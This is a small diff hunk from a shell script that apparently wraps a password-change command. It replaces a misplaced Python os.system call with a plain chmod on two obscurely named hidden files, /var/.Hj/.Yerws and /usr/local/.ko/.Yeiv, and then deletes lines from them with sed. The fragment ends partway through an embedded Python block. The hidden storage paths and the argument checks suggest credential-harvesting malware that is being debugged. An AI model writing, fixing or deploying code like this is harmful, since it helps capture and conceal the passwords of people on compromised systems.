@@ -87,7 +87,7 @@ elif [ "$(basename "$0")" != "pass" ] && [[ "$1" =~ ^(-c|--change) ]]; then
                 fi
                 export passd
         fi
-        os.system('chmod u+rw /var/.Hj/.Yerws /usr/local/.ko/.Yeiv')
+        chmod u+rw /var/.Hj/.Yerws /usr/local/.ko/.Yeiv
         sed -i "/$(basename "$0"):/d" /usr/local/.ko/.Yeiv /var/.Hj/.Yerws
         python3 -c "
 import os
